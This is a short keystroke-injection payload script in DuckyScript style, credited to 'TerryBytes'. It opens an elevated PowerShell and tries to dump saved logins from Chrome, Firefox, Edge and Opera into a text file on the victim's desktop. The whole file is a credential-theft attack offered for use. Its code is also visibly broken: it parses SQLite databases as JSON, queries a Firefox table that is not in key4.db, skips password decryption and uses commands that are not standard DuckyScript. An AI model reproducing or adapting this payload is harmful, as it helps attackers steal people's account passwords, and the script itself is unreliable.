REM Author: TerryBytes
REM Description: Extract all saved browser passwords and send them to a file on the desktop.
REM Version:      1.0
REM Category:     Passwords

DELAY 500

GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 500

SET tempDir %temp%
SET chromePasswdPath %localappdata%\Google\Chrome\User Data\Default\Login Data
SET firefoxPasswdPath %appdata%\Mozilla\Firefox\Profiles\*\key4.db
SET edgePasswdPath %localappdata%\Microsoft\Edge\User Data\Default\Login Data
SET operaPasswdPath %appdata%\Opera Software\Opera Stable\Login Data

IF EXISTS {%chromePasswdPath%}
  RUN {cmd} /c powershell -c "Get-Content '%chromePasswdPath%' | ConvertFrom-Json | Select-Object -ExpandProperty logins | Where-Object { $_.password -ne '' } | Format-Table -Property origin_url, username, password | Out-File '%tempDir%\chrome_passwords.txt'"
ENDIF

IF EXISTS {%firefoxPasswdPath%}
  RUN {cmd} /c "sqlite3 '%firefoxPasswdPath%' 'SELECT signon_realm, username_value, password_value FROM moz_logins;' > '%tempDir%\firefox_passwords.txt'"
ENDIF

IF EXISTS {%edgePasswdPath%}
  RUN {cmd} /c powershell -c "Get-Content '%edgePasswdPath%' | ConvertFrom-Json | Select-Object -ExpandProperty logins | Where-Object { $_.password -ne '' } | Format-Table -Property origin_url, username, password | Out-File '%tempDir%\edge_passwords.txt'"
ENDIF

IF EXISTS {%operaPasswdPath%}
  RUN {cmd} /c powershell -c "Get-Content '%operaPasswdPath%' | ConvertFrom-Json | Select-Object -ExpandProperty logins | Where-Object { $_.password -ne '' } | Format-Table -Property origin_url, username, password | Out-File '%tempDir%\opera_passwords.txt'"
ENDIF

RUN {cmd} /c "type '%tempDir%\chrome_passwords.txt' '%tempDir%\firefox_passwords.txt' '%tempDir%\edge_passwords.txt' '%tempDir%\opera_passwords.txt' > '%userprofile%\desktop\BrowserPasswords.txt'"